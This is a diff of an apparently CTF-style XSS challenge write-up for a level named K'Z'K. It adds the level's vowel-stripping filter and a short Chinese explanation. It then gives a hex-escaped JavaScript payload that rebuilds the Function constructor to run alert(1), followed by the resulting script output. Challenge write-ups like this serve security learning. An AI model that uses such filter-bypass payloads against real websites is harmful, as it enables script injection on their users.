@@ -547,19 +547,34 @@ Output
 ```
 
 
-<a name="a019"/></a>**No**
+<a name="a019"/></a>
+### No
 
 
 ----------
 
 
-<a name="a020"/></a>**K'Z'K**
+<a name="a020"/></a>
+### K'Z'K
+```javascript
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels in honor of K'Z'K the Destroyer
+    s = s.replace(/[aeiouy]/gi, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+采用匿名函数调用的方法，构造```[]["pop"]["constructor"]('alert(1)')()```的十六进制绕过，得到payload
+```html
+"|[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()|"
+```
+Output
+```html
+<script>console.log(""|[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()|"");</script>
+```
 
-
-----------
-
-
-<a name="a021"/></a>**K'Z'K**
+<a name="a021"/></a>
+### K'Z'K
 
 
 ----------
